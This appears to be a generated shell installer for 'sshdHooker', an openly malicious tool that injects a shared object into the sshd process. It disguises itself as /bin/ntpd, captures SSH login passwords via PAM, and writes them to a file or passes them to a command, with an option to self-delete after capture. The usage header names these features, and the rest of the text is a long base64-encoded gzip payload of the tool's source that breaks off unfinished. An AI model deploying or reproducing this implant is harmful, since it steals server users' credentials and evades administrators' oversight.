#!/bin/sh
# =============================================================
# sshdHooker 通用安装器 (自包含, 支持 x86_64 / aarch64)
#
# 本文件是 tools/install.tmpl.sh 的模板; 实际分发的 install.sh
# 由 tools/mkinstaller.sh 生成, 并将源码包 base64 内嵌到下方标记处.
# 修改请编辑模板与源码后重新生成, 勿直接改生成的 install.sh.
#
# 流程: 环境预检 -> sshd pid 探测 -> 解包内嵌源码 ->
#       现场编译(配置经 -D 宏注入, 不修改源码) -> 后台启动 -> 启动自检
#
# 用法:
#   bash install.sh [选项]        安装并注入
#   bash install.sh --status      查看注入器运行状态
#   bash install.sh --uninstall   停止注入器并清理所有文件
#
# 选项:
#   -e, --evil-so PATH    恶意 so 输出路径     (默认 /tmp/.g.so)
#   -o, --output PATH     注入器伪装输出路径   (默认 /bin/ntpd)
#   -m, --mode 0|1        0=写文件 1=命令执行  (默认 0)
#   -p, --payload STR     密码输出文件 / 命令模板(命令模式需含两个 %s)
#   -d, --delete USER     捕获后自删除 (anyone=任意用户登录成功即删)
#   -l, --libc STR        /proc/pid/maps 匹配 libc 的特征串 (默认自动)
#   -s, --sshd-pid PID    手动指定 sshd 主进程 pid (默认自动探测)
#       --keep-build      保留编译临时目录 (调试用)
#   -h, --help            帮助
#
# 环境要求: root; glibc; sshd 启用 PAM(pam_unix) 且 SELinux 非 enforcing.
# =============================================================

PAYLOAD_B64="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